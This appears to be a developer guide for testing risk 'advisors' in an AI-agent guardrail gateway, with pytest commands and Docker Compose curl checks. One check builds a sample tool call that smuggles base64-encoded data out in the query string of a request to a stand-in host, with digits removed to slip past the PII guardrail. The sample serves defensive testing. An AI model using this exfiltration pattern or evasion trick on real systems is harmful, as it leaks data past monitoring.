# Testing advisors

Part 1 is the automated tests; Part 2 is a short walk through the Docker Compose stack that makes
an advisor change a decision and shows the pilot analytics.

## Part 1: automated tests

```bash
cd services/guardrail-gateway && pip install -r requirements-dev.txt
pytest -q tests/test_advisors.py                      # contract, panel rules, providers, flow
cd ../guardrail-control-plane && pytest -q tests/test_services.py -k advisor
cd ../../apps/console && npm test                      # advisor helpers and API client
```

| Test | Proves |
| --- | --- |
| `test_questions_carry_derived_features_never_text` | the question has no payload text, values or host names |
| `test_answers_are_strict`, `test_points_are_capped_and_never_negative` | typed answers; benign adds nothing |
| `test_only_the_uncertain_band` | advisors run for elevated/high, not low or critical |
| `test_shadow_advisors_change_nothing_but_are_recorded` | shadow mode is audit-only |
| `test_caps_per_advisor_and_in_total` | per-advisor cap and the total cap |
| `test_failures_are_no_signal` | timeout, error, garbage and injected extra fields all count as no signal |
| `test_hosted_advisors_follow_the_tenant_data_policy` | a hosted advisor is skipped unless the tenant opted in |
| `test_advisor_verify_only_tightens_the_table` | `ADVISOR_VERIFY` can only make the outcome stricter |
| `test_flow_enforcing_advisor_tightens_and_the_agent_never_sees_why` | end to end; the agent never learns the advisor's name or output |
| `test_tenant_advisor_policy_is_opt_in_and_published` | the data policy, its gateway-capability guard, and the catalog |
| `test_advisor_pilot_analytics_shapes_the_audit_rows` | the pilot analytics over the audit log |

## Part 2: the live stack

```bash
docker compose up --build -d          # ADVISORS_JSON seeds the local advisor in shadow mode
until curl -sf localhost:8100/ready >/dev/null; do sleep 2; done
GW=$(docker compose exec -T guardrail-gateway sh -c '. /bootstrap/dev.env; echo $DEMO_GATEWAY_API_KEY')
guard() { curl -s localhost:8100/v1/guard/tool -H "X-API-Key: $GW" -H 'Content-Type: application/json' -d "$1"; }
```

Advisors only run in the **uncertain bands** (elevated and high). A low-risk request doesn't need
them, and a critical one is decided without them, so the example has to land in between. It's a
GET to a host the agent has never used, smuggling data out in its query string. Each call uses a
new host and session, so you can run it again. The query has no digits on purpose: the PII
guardrail reads a run of digits as a phone number and blocks the call before any advisor is asked.

```bash
Q=$(python3 -c "import base64,re;print(re.sub(r'[0-9=]','',base64.urlsafe_b64encode(b'quarterly revenue by region '*24).decode()))")
send() {  # $1 = query string, or empty for the control request
  H=$(tr -dc a-z </dev/urandom | head -c 8)
  guard "{\"agent_id\":\"research-agent\",\"action\":\"http.post\",\"session_id\":\"s-$H\",
    \"payload\":{\"tool_call\":{\"name\":\"http.post\",\"arguments\":
      {\"url\":\"https://cdn-$H.example.net/p.gif$1\",\"method\":\"GET\"}}}}" \
    | jq '{outcome, risk: .risk.score, band: .risk.band, mode: .risk.mode, codes: .reason_codes}'
}
advisors() {  # the agent never sees advisor output, in any mode: read it from the audit record
  docker compose exec -T postgres psql -U gateway -d gateway -At -c \
    "select risk->'advisors' from audit.audit_events order by created_at desc limit 1" | jq .
}
```

### Check 1: shadow by default (nothing changes, the answer is recorded)

```bash
send "?d=$Q"; advisors      # encoded data in the query
send "";      advisors      # the same call without it (control)
```

The default `RISK_MODE=shadow` gives `mode: "shadow"` and band `elevated` (score 50 for a fresh
`research-agent`), and the outcome is `allow` either way. The audit record shows the local
advisor's answers: for the first call the `exfiltration` question is `suspicious` (about 0.55) with
`shadow_points` of about 3; for the control both questions are `benign`. The API response never
includes advisor output, in shadow or enforce mode.

### Check 2: an advisor tightening a decision (enforce)

```bash
RISK_MODE=enforce ADVISORS_JSON='[{"name":"local","provider":"local","mode":"enforce","cap":15}]' \
  docker compose up -d guardrail-gateway
until curl -sf localhost:8100/ready >/dev/null; do sleep 2; done
GW=$(docker compose exec -T guardrail-gateway sh -c '. /bootstrap/dev.env; echo $DEMO_GATEWAY_API_KEY')
```

Re-run Check 1 (`send "?d=$Q"` and `send ""`). Now the advisor's points count: the first call
scores a few points higher than the control and carries `ADVISOR_RISK` among its reason codes,
never a code naming the advisor. It stays `allow` here, because the local model only adds points
(its `verify_at` is 1.0) and 50 plus a few is still elevated. With more points (up to the `cap`)
a request near the top of a band crosses into `high`, where the table asks for verification.

A low-risk call skips advisors entirely (score 15 for a fresh `research-agent`, band `low`, and
no `advisors` in its audit record):

```bash
curl -s localhost:8100/v1/guard/input -H "X-API-Key: $GW" -H 'Content-Type: application/json' \
  -d '{"agent_id": "research-agent", "action": "llm.chat", "session_id": "s-low",
       "payload": {"text": "Summarise our refund policy"}}' | jq '{outcome, band: .risk.band}'
advisors    # prints nothing: no advisor ran
```

Scores depend on history: every blocked request adds to an agent's `REPEATED_DENIALS` penalty for
a few days, and an unknown action (one that isn't in the tenant's action catalog) scores 100. If
your numbers are higher than these, that's why; use an agent with a clean history.

### Check 3: the pilot analytics

```bash
ADMIN=$(docker compose exec -T guardrail-control-plane sh -c '. /bootstrap/cp.env; echo $CP_ADMIN_KEY')
curl -s localhost:8200/cp/v1/analytics/advisors -H "X-Admin-Key: $ADMIN" | jq '.advisors[] | {advisor, mode, questions, no_signal_rate, agreement}'
```

Each advisor shows its answer counts, how often it produced no signal, and its agreement with the
final outcome. In the console, open **Advisors** (under Observe): the table plus, with a tenant
selected, the **hosted advisor data policy** (local advisors ignore it).

### Check 4: a hosted advisor needs the tenant to opt in

```bash
ADVISORS_JSON='[{"name":"jev","provider":"http","mode":"shadow","options":{"url":"http://mcp-demo:8765/noop","allow_http":true}}]' \
  docker compose up -d guardrail-gateway
```

With no advisor policy set for the `demo` tenant, the hosted advisor is skipped
(`status: skipped_policy` in the audit record, nothing sent). Opt in, and it is asked:

```bash
curl -s -X PUT localhost:8200/cp/v1/tenants/demo/advisor-policy -H "X-Admin-Key: $ADMIN" \
  -H 'Content-Type: application/json' -d '{"data_classes": ["PUBLIC", "INTERNAL", "PII"]}' | jq .advisor_data_classes
```

## What "working" looks like

| Check | Pass when |
| --- | --- |
| Shadow | decisions unchanged; the audit record's `risk.advisors` has each answer and the `shadow_points` |
| Enforce | the advisor can raise risk / ask to verify, never permit; the agent never sees the advisor |
| Band | low-risk requests skip advisors entirely |
| Policy | a hosted advisor is skipped until the tenant opts in for the data class |
| Analytics | the Advisors page and `/analytics/advisors` show answers, no-signal rate and agreement |

## Troubleshooting

| Symptom | Likely cause |
| --- | --- |
| gateway won't start: "unknown advisor provider" | a typo in `ADVISORS_JSON`'s `provider` |
| gateway won't start: "must start with ADVISOR_SECRET_" | an `http` advisor's `auth_env` names a non-`ADVISOR_SECRET_*` variable |
| advisor always `no signal` | the endpoint is slow (raise `timeout_ms`), unreachable, or returns a non-conforming body |
| no advisor answers in the audit record | the request was `low` or `critical` (advisors only run for elevated and high), or a guardrail or the policy refused it first |
| `GUARDRAIL_BLOCK` with `PHONE_NUMBER` on a test URL | digits in the URL look like a phone number to the PII guardrail; use letters only |
| outcome `hold` with `RISK_CRITICAL` on a simple call | the action isn't in the tenant's action catalog (scores 100), or the agent has a `REPEATED_DENIALS` penalty |
| hosted advisor always `skipped_policy` | the tenant hasn't opted in for the request's data class |
| turning on a tenant policy returns 422 | a live gateway is older than 0.9 (no `advisors_v1` capability) |
